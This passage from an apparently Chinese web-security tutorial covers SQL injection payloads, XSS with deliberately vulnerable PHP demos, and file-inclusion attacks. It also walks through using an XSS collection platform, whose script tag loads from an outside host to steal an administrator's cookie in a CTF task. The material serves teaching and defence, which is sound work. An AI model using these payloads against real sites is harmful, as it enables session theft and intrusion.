class="line"><span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a);</span><br><span class="line"></span><br><span class="line">- Extractvalue(Mysql): and (extractvalue(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>)));</span><br><span class="line"></span><br><span class="line">- Updatexml(Mysql): and (updatexml(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>),<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">- EXP: and exp(~(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a));</span><br><span class="line"></span><br><span class="line">- UTL INADDR. get host address(Oracle): and 1=utl inaddrget host address(<span class="keyword">select</span> bannerO <span class="keyword">from</span> sys.v_$<span class="keyword">version</span> <span class="keyword">where</span> <span class="keyword">rownum</span>=<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">- multipoint(Mysql)：<span class="keyword">and</span> multipoint((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br><span class="line"></span><br><span class="line">- polygon(Mysql)：and polygon((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br><span class="line"></span><br><span class="line">- multipolygon(Mysql)：and multipolygon((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> </span><br><span class="line"><span class="keyword">user</span>())a)b));</span><br><span class="line"></span><br><span class="line">- linestring(Mysql)：and linestring((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br><span class="line"></span><br><span class="line">- multilinestring(Mysql)：and multilinestring((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br></pre></td></tr></table></figure><h4 id="bool盲注"><a href="#bool盲注" class="headerlink" title="bool盲注"></a>bool盲注</h4><ul><li><p>盲注的时候一定注意，MySQL4之后大小写不敏感，可使用binary()函数使大小写敏感。</p></li><li><h5 id="布尔条件构造"><a href="#布尔条件构造" class="headerlink" title="布尔条件构造"></a>布尔条件构造</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">//正常情况</span><br><span class="line"> 'or bool<span class="comment">#</span></span><br><span class="line"> true'and bool<span class="comment">#</span></span><br><span class="line">     </span><br><span class="line"> //不使用空格、注释</span><br><span class="line"> 'or(bool)='1</span><br><span class="line"> true'and(bool)='1</span><br><span class="line">     </span><br><span class="line"> //不使用or、and、注释</span><br><span class="line"> '^!(bool)='1</span><br><span class="line"> '=(bool)='</span><br><span class="line"> '||(bool)='1</span><br><span class="line"> true'%26%26(bool)='1</span><br><span class="line"> '=if((bool),1,0)='0</span><br><span class="line">     </span><br><span class="line"> //不使用等号、空格、注释</span><br><span class="line"> 'or(bool)&lt;&gt;'0</span><br><span class="line"> 'or((bool)in(1))or'0</span><br><span class="line">     </span><br><span class="line"> //其他</span><br><span class="line"> or (case when (bool) then 1 else 0 <span class="keyword">end</span>)</span><br></pre></td></tr></table></figure></li><li><p>有时候where字句有括号又猜不到SQL语句的时候，可以有下列类似的fuzz</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1' or (bool) or '1'='1</span><br><span class="line">1%' and (bool) or 1=1 and '1'='1</span><br></pre></td></tr></table></figure></li><li><h5 id="构造逻辑判断"><a href="#构造逻辑判断" class="headerlink" title="构造逻辑判断"></a>构造逻辑判断</h5><ul><li><p>逻辑判断基本就那些函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">left(user(),1)&gt;&#39;r&#39;  </span><br><span class="line">right(user(),1)&gt;&#39;r&#39;  </span><br><span class="line">substr(user(),1,1)&#x3D;&#39;r&#39;  </span><br><span class="line">mid(user(),1,1)&#x3D;&#39;r&#39; </span><br><span class="line">    </span><br><span class="line">&#x2F;&#x2F;不使用逗号 </span><br><span class="line">user() regexp &#39;^[a-z]&#39;</span><br><span class="line">user() like &#39;root%&#39;</span><br><span class="line">POSITION(&#39;root&#39; in user())</span><br><span class="line">mid(user() from 1 for 1)&#x3D;&#39;r&#39;</span><br><span class="line">mid(user() from 1)&#x3D;&#39;r&#39;</span><br></pre></td></tr></table></figure></li></ul></li><li><h5 id="利用order-by盲注"><a href="#利用order-by盲注" class="headerlink" title="利用order by盲注"></a>利用order by盲注</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from admin where username='' or 1 union select 1,2,'5' order by 3;</span><br><span class="line">+<span class="comment">----+--------------+------------------------</span></span><br><span class="line">| id |    username  | password                   </span><br><span class="line">+<span class="comment">----+--------------+------------------------</span></span><br><span class="line">|  1 | 2            | 5                         </span><br><span class="line">|  1 | admin        | 51b7a76d51e70b419f60d34 </span><br><span class="line">+<span class="comment">----+----------- --+------------------------</span></span><br><span class="line">2 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line">    </span><br><span class="line">mysql&gt; <span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> username=<span class="string">''</span> <span class="keyword">or</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="string">'6'</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span>;</span><br><span class="line">+<span class="comment">-----+-----------+--------------------------</span></span><br><span class="line">|id   | username  | password                  </span><br><span class="line">+<span class="comment">-----+-----------+--------------------------</span></span><br><span class="line">|  1  | admin     |51b7a76d51e70b419f60d3</span><br><span class="line">|  1  |    2      | 6                          </span><br><span class="line">+<span class="comment">-----+-----------+--------------------------</span></span><br><span class="line">2 rows in <span class="keyword">set</span> (<span class="number">0.01</span> sec)</span><br></pre></td></tr></table></figure></li></ul><h4 id="延时盲注"><a href="#延时盲注" class="headerlink" title="延时盲注"></a>延时盲注</h4><ul><li>相对于bool盲注，就是把返回值0和1改为是否执行延时，能用其他方法就不使用延时。</li><li>一般格式if((bool),sleep(3),0)和or (case when (bool) then sleep(3) else 0 end)</li><li>两个函数：</li><li>BENCHMARK(100000,MD5(1))</li><li>sleep(5)</li><li>BENCHMARK()用于测试函数的性能，参数一为次数，二为要执行的表达式。可以让函数执行若干次，返回结果比平时要长，通过时间长短的变化，判断语句是否执行成功。这是一种边信道攻击，在运行过程中占用大量的cpu资源，推荐使用sleep()。</li></ul><h4 id="Mysql注释符"><a href="#Mysql注释符" class="headerlink" title="Mysql注释符"></a>Mysql注释符</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. <span class="comment">-- -</span></span><br><span class="line">2. <span class="comment">/* .... */</span></span><br><span class="line">3. <span class="comment">#</span></span><br><span class="line">4. `</span><br><span class="line">5. ;%00</span><br></pre></td></tr></table></figure><h4 id="GBK绕过注入"><a href="#GBK绕过注入" class="headerlink" title="GBK绕过注入"></a>GBK绕过注入</h4><ul><li>在分号前加%df%27</li><li>示例：id=1%df%27 union select 1.2–+</li></ul><h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><p>以HDWiki v6.0 UTF8-20170209 前台sql注入为例，index.php?doc-create创建词条可以通过<code>aaaa……aa&#39;</code> 81个字符，经过转义变成<code>aaaa……aa\&#39;</code>82个字符，经过截断变成<code>aaaa……aa\</code>81个字符，将sql语句中的单引号转义，并且后面一个参数用户可控，产生了SQL注入</p><p><code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#39;</code></p><p><code>，concat(user(),0x7c,database(),0x7c,version()),1,1,#</code></p><h4 id="漏洞防范"><a href="#漏洞防范" class="headerlink" title="漏洞防范"></a>漏洞防范</h4><h5 id="gpc-rutime魔术引号"><a href="#gpc-rutime魔术引号" class="headerlink" title="gpc/rutime魔术引号"></a>gpc/rutime魔术引号</h5><ul><li>magic_quotes_gpc负责对GET、POST、COOKIE的值进行过滤</li><li>magic_quotes_runtime对从数据库或者文件中获取的数据进行过滤。上面的二次注入可以使用这个函数对特殊符号转义</li></ul><p>开启这两个选项也只能防御部分SQL注入。因为他们只对<code>&#39;</code>、<code>&quot;</code>、<code>\</code>、<code>空字符</code>进行转义,在int型注入上没有太大作用。</p><h5 id="过滤函数和类"><a href="#过滤函数和类" class="headerlink" title="过滤函数和类"></a>过滤函数和类</h5><h6 id="addslashes函数"><a href="#addslashes函数" class="headerlink" title="addslashes函数"></a>addslashes函数</h6><p>addslashes也是对<code>&#39;</code>、<code>&quot;</code>、<code>\</code>、<code>空字符</code>进行转义，大多数程序使用它实在程序入口，判断如果没有没有开启gpc,则使用它对参数进行过滤,不过他的参数必须是string,所以如果参数是数组类型,那么必须使用此函数对数组递归过滤。</p><h6 id="mysql-real-escape-string"><a href="#mysql-real-escape-string" class="headerlink" title="mysql_[real]_escape_string"></a>mysql_[real]_escape_string</h6><p>mysql_escape_string和mysql_real_escape_string函数都是对字符串进行过滤,在php4.0.3以上版本才有这两个函数,<code>\x00</code>、<code>\n</code>、<code>\r</code>、<code>\</code>、<code>&#39;</code>、<code>&quot;</code>、<code>\x1a</code>。不同在于mysql_real_escape_string接受的是一个连接句柄并根据当前字符集转义字符串,所以最好使用mysql_real_escape_string。</p><p>mysql_escape_string</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$item = <span class="string">"Zak's Laptop"</span>;</span><br><span class="line">$escaped_item = mysql_escape_string($item);</span><br></pre></td></tr></table></figure><p>mysql_real_escape_string</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$conn = mysql_connect(<span class="string">'localhost'</span>, <span class="string">'root'</span>, <span class="string">'root'</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'bad!'</span>);</span><br><span class="line">$item = <span class="string">"Zak's Laptop"</span>;</span><br><span class="line">$escaped_item = mysql_real_escape_string($item,$conn);</span><br></pre></td></tr></table></figure><h6 id="intval"><a href="#intval" class="headerlink" title="intval"></a>intval</h6><p>将字符转换成数值</p><p>eg:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$id = <span class="string">'1 union select'</span>;</span><br><span class="line">$id = intval($id);</span><br><span class="line"><span class="keyword">echo</span> $id;</span><br></pre></td></tr></table></figure><h5 id="PDO预编译方式"><a href="#PDO预编译方式" class="headerlink" title="PDO预编译方式"></a>PDO预编译方式</h5><p>使用PDO方式基本可以防止sql注入,原因是因为有两次传输，前一次传一个sql模板，第二次传查询参数，会把第二步传入的参数只做查询参数处理，不做语义解释，这样注入的条件就算执行了，也不会得到查询结果。但是还是存在特殊情况会在使用了PDO方式也会存在注入,可以参考<a href="https://stackoverflow.com/questions/134099/are-pdo-prepared-statements-sufficient-to-prevent-sql-injection/12202218#12202218" target="_blank" rel="noopener">https://stackoverflow.com/questions/134099/are-pdo-prepared-statements-sufficient-to-prevent-sql-injection/12202218#12202218</a></p><p>eg:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">$pdo = <span class="keyword">new</span> PDO(<span class="string">'mysql:host=localhost;dbname=test'</span>, <span class="string">'root'</span>, <span class="string">'root'</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (PDOException $e) &#123;</span><br><span class="line"><span class="keyword">echo</span> $e-&gt;getMessage();</span><br><span class="line">&#125;</span><br><span class="line">$sta = $pdo-&gt;prepare(<span class="string">'select * from table where name = ?'</span>); <span class="comment">//准备 SQL 模版，其中 ? 代表一个参数。</span></span><br><span class="line">$sta-&gt;execute(<span class="keyword">array</span>(<span class="string">'name1'</span>)); <span class="comment">//通过数组设置参数，执行 SQL 模版</span></span><br></pre></td></tr></table></figure><h2 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h2><h3 id="成因与危害"><a href="#成因与危害" class="headerlink" title="成因与危害"></a>成因与危害</h3><p>参数没有被过滤或严格过滤,且参数传入到了输出函数,被输出到了页面。常出现在文章发表、评论回复、留言、资料修改等地方。</p><p>可能产生如下危害:</p><ul><li>窃取cookie</li><li>修改页面进行钓鱼</li><li>前端能做的事情,xss都能做到</li></ul><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p>反射型、存储型、dom型</p><h3 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h3><p>经过了后端,但是没有经过经过数据库。</p><p>数据流向: 浏览器 -&gt; 后端 -&gt; 浏览器</p><p>eg:</p><p>reflectxss.php(test on mysql 5.5.38)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">XSS反射演示</span><br><span class="line">&lt;form action=<span class="string">""</span> method=<span class="string">"get"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"text"</span> name=<span class="string">"xss"</span>/&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span> value=<span class="string">"test"</span>/&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line">$xss = @$_GET[<span class="string">'xss'</span>];</span><br><span class="line"><span class="keyword">if</span>($xss!==<span class="keyword">null</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $xss;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>http://127.0.0.1/reflectxss.php?xss=%3Cimg+src%3Dx+onerror%3Dalert%28document.cookie%29%3E</code></p><p>恶意利用(以获取用户cookie为例):<br>比如<code>http://xxx.com/xxx.php?aaa=攻击者编写的获取用户cookie的代码</code>存在反射型xss,<br>攻击者可以把构造好的链接发到论坛或者其他方式诱导用户点击,如果用户点击了链接,那么用户的cookie会被攻击者的服务器收到,攻击者可以利用用户的cookie登陆目标网站</p><h3 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h3><p>数据经过了后端,经过了数据库。</p><p>数据流向: 浏览器-&gt; 后端-&gt; 数据库-&gt; 后端-&gt; 浏览器</p><p>eg:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">create table xss (</span><br><span class="line">    id int(10) unsigned NOT NULL AUTO_INCREMENT,</span><br><span class="line">    payload varchar(100) NOT NULL,</span><br><span class="line">    PRIMARY KEY (id)</span><br><span class="line">)ENGINE&#x3D;MyISAM DEFAULT CHARSET&#x3D;utf8;</span><br></pre></td></tr></table></figure><p>storagexss.php(test on mysql 5.5.38)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">\\存储XSS演示</span><br><span class="line">&lt;form action=<span class="string">""</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"text"</span> name=<span class="string">"xss"</span>/&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span> value=<span class="string">"test"</span>/&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$xss=@$_POST[<span class="string">'xss'</span>];</span><br><span class="line">mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line">mysql_select_db(<span class="string">"test"</span>);</span><br><span class="line"><span class="keyword">if</span>($xss!==<span class="keyword">null</span>)&#123;</span><br><span class="line">    $sql=<span class="string">"insert into xss(id,payload) values(1,'$xss')"</span>;</span><br><span class="line">    $result=mysql_query($sql);</span><br><span class="line">    <span class="keyword">echo</span> $result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>storagexsshow.php(test on mysql 5.5.38)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line">mysql_select_db(<span class="string">"test"</span>);</span><br><span class="line">$sql=<span class="string">"select payload from xss"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line"><span class="keyword">while</span>($row=mysql_fetch_array($result))&#123;</span><br><span class="line">    <span class="keyword">echo</span> $row[<span class="string">'payload'</span>]; </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>storagexss.php post:<code>&lt;img src=x onerror=alert(document.cookie)&gt;</code><br>访问storagexsshow.php会弹出cookie</p><p>恶意利用(以评论区存在存储型xss为例):假如某网站评论区存在xss存储行漏洞,攻击者在评论中插入获取cookie的代码,当每个用户看到此评论时,他们的cookie都会被发送到攻击者服务器。</p><h3 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h3><p>没有经过后端,只在前端触发。</p><p>数据流向是：URL–&gt;浏览器 </p><p>eg:</p><p>domxss.php(test on mysql 5.5.38)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>); <span class="comment">//禁用错误报告</span></span><br><span class="line">$q = $_GET[<span class="string">"q"</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;form action=<span class="string">""</span> method=<span class="string">"get"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"text"</span> name=<span class="string">"q"</span> id=<span class="string">'text'</span> value=<span class="string">"&lt;?php echo $q;?&gt;"</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span> value=<span class="string">"test"</span>/&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;div id=<span class="string">"print"</span>&gt;&lt;/div&gt;</span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line"><span class="keyword">var</span> text = document.getElementById(<span class="string">"text"</span>); </span><br><span class="line"><span class="keyword">var</span> <span class="keyword">print</span> = document.getElementById(<span class="string">"print"</span>);</span><br><span class="line"><span class="keyword">print</span>.innerHTML = text.value + <span class="string">' not found'</span>; <span class="comment">// 获取 text的值，并且输出在print内。这里是导致xss的主要原因。</span></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><code>http://127.0.0.1/domxss.php?q=%3Cimg+src%3Dx+onerror%3Dalert%28document.cookie%29%3E</code></p><p>恶意利用和反射型xss类似</p><h3 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h3><p>以ESPCMS P8.18101601n 前台XSS为例，问题主要由于错误页面的报错信息未作过滤，造成XSS漏洞。</p><p>payload:<code>http://127.0.0.1/espcms/index.php?ac=%3C/code%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E&amp;at=List&amp;tid=7</code></p><h3 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h3><ul><li>特殊字符HTML实体编码</li><li>标签黑白名单(推荐白名单,黑名单可能存在不可预测的绕过)</li><li>请求头设置HttpOnly属性(cookie不能通过js调用获取)</li></ul><h3 id="XSS-平台使用简要教程"><a href="#XSS-平台使用简要教程" class="headerlink" title="XSS 平台使用简要教程"></a>XSS 平台使用简要教程</h3><h4 id="找一个xss接收平台，并完成注册等一系列操作"><a href="#找一个xss接收平台，并完成注册等一系列操作" class="headerlink" title="找一个xss接收平台，并完成注册等一系列操作"></a>找一个xss接收平台，并完成注册等一系列操作</h4><p>这里以 <a href="https://xsshs.cn/" target="_blank" rel="noopener">https://xsshs.cn/</a> 做例子</p><p><img src="https://s2.ax1x.com/2020/02/07/12BSxg.png" alt="12BSxg.png"></p><p>登陆平台</p><h4 id="创建和配置项目"><a href="#创建和配置项目" class="headerlink" title="创建和配置项目"></a>创建和配置项目</h4><p><img src="https://s2.ax1x.com/2020/02/07/12B9MQ.png" alt="12B9MQ.png"></p><p><img src="https://s2.ax1x.com/2020/02/07/12BCrj.png" alt="12BCrj.png"></p><p>填写好项目名称和描述（自定义）</p><p>然后进行配置：</p><p><img src="https://s2.ax1x.com/2020/02/07/120Oat.png" alt="120Oat.png"></p><p>比如这里我们需要获取管理员的cookie，就勾上<img src="https://s2.ax1x.com/2020/02/07/120LVI.png" alt="120LVI.png"></p><p>点击下一步</p><p>就会进入到项目代码，注意，上面的代码都是已经封装好的了，包括接收url什么的，我们直接使用就可以了。</p><h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><p><img src="https://s2.ax1x.com/2020/02/07/120I2D.png" alt="120I2D.png"></p><p>比如我们随便挑一个最简单的来使用</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;sCrIpt srC=<span class="comment">//xs.sb/boJN&gt;&lt;/sCRipT&gt;</span></span><br></pre></td></tr></table></figure><p>我们以C1CTF的xss题目来做例子</p><p><img src="https://s2.ax1x.com/2020/02/07/120Hrd.png" alt="120Hrd.png"></p><p>将代码复制到你觉得可能会产生xss的地方，这里点提交后，保存了在一个页面</p><p><img src="https://s2.ax1x.com/2020/02/07/1204PK.png" alt="1204PK.png"></p><p>当有用户（带cookie）访问这个页面的时候，此用户的cookie就会被获取并且发送到我们的平台，一般来说我们需要admin的cookie。这题的逻辑是直接发送页面id让管理员检查</p><p><img src="https://s2.ax1x.com/2020/02/07/120vPf.png" alt="120vPf.png"></p><p>然后就等着接收就可以了。</p><h4 id="接收"><a href="#接收" class="headerlink" title="接收"></a>接收</h4><p>在平台里的项目内容里就可以查看到xss的结果了</p><p><img src="https://s2.ax1x.com/2020/02/07/120xG8.png" alt="120xG8.png"></p><h3 id="收集常见的XSS-payload"><a href="#收集常见的XSS-payload" class="headerlink" title="收集常见的XSS payload"></a>收集常见的XSS payload</h3><p><a href="https://packetstormsecurity.com/files/112152/Cross-Site-Scripting-Payloads.html" target="_blank" rel="noopener">Cross-Site-Scripting-Payloads</a></p><h2 id="文件操作漏洞"><a href="#文件操作漏洞" class="headerlink" title="文件操作漏洞"></a>文件操作漏洞</h2><p>总的来说时因为没有经过严格的验证,操作的文件是否在允许的范围内。</p><p>危害:</p><ul><li>导致恶意文件/代码包含</li><li>导致敏感文件被读取</li><li>导致文件被删除</li><li>导致恶意文件上传</li></ul><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>文件包含分为本地文件包含(local file include)、远程文件包含(remote file include)。文件包含可以导致恶意代码被包含,从而获取webshell</p><p>文件包含利用函数:</p><ul><li>include(即使文件被包含过,也会再次包含,包含文件遇到错误代码也会继续执行)</li><li>include_once(文件被包含过了,就不会再次包含,包含文件遇到错误也会继续执行)</li><li>require(即使文件被包含过,也会再次包含,包含文件遇到错误程序直接退出)</li><li>require_once(文件被包含过了,就不会再次包含,包含文件遇到错误程序直接退出)</li><li>…</li></ul><p>本地文件包含(LFI):</p><p>只能包含本机文件,大多出现在模块加载、模板加载和cache调用等地方。<br>本地文件包含方式也有多种,比如上传一个允许上传的文件格式的文件在包含,包含PHP上传的临时文件,webserver记录到日志后在包含webserver的日志,linux下可以包含/proc/self/environ文件等。</p><p>eg:<br>localfileinclude.php(test on php 5.5.38)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">define(<span class="string">"ROOT"</span>,dirname(<span class="keyword">__FILE__</span>).<span class="string">'/'</span>);</span><br><span class="line">$mod = $_GET[<span class="string">'mod'</span>];</span><br><span class="line"><span class="keyword">echo</span> ROOT.$mod.<span class="string">'.php'</span>;</span><br><span class="line"><span class="keyword">include</span>(ROOT.$mod.<span class="string">'.php'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>lfishell.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>http://127.0.0.1/localfileinclude.php?mod=lfishell</code></p><p>远程文件包含:</p><p>可以包含远程文件。需要设置allow_url_include=on。支持http、ftp、php伪协议、zip、file等协议。</p><p>eg:</p><p>remotefileinclude.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>($_GET[<span class="string">'url'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>使用python开启一个见到的服务器:<br><code>python -m SimpleHTTPServer 8080</code></p><p>rfi.txt</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>http://127.0.0.1/remotefileinclude.php?url=http://127.0.0.1:8080/Desktop/rfi.txt</code></p><p>使用伪协议(举两个伪协议例子):</p><p>php://input</p><ul><li>allow_url_fopen：off/on</li><li>allow_url_include：on<br><code>http://127.0.0.1/remotefileinclude.php?url=php://input</code><br><code>post: &lt;?php phpinfo();?&gt;</code></li></ul><p>php://filter</p><ul><li>allow_url_fopen：off/on</li><li>allow_url_include：off/on<br><code>http://127.0.0.1/remotefileinclude.php?url=php://filter/read=convert.base64-encode/resource=remotefileinclude.php</code></li></ul><p>截断包含:</p><p>00截断(受限于GPC和addslashes等函数影响,php5.3之后也不能使用这个方法,不过现在很少有这个漏洞了):</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> $_GET[<span class="string">'a'</span>].<span class="string">'.php'</span>;</span><br><span class="line"><span 